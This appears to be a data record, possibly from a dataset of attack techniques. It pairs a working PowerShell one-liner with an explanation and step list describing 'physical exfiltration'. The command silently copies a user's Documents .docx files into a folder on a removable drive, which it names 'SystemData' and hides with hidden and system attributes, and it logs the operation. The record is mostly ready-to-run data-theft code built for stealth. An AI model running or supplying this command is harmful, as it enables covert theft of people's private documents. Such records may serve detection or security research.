command: $dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest="$dl`:\SystemData"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h +s $dest; Copy-Item -Path "$env:USERPROFILE\Documents\*.docx" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Write-Output "Copied DOCX to $dest at $(Get-Date)" | Out-File "$dest\op.log" -Append
explanation: Copies local DOCX files to a hidden folder on a removable drive for physical exfiltration; logs the action locally using Write-Output.
rationale_steps: Identify first attached removable drive letter
Create and hide a destination directory on the removable media
Copy target document files to the removable media using Copy-Item
Record a local operation log via Write-Output to a file on the device
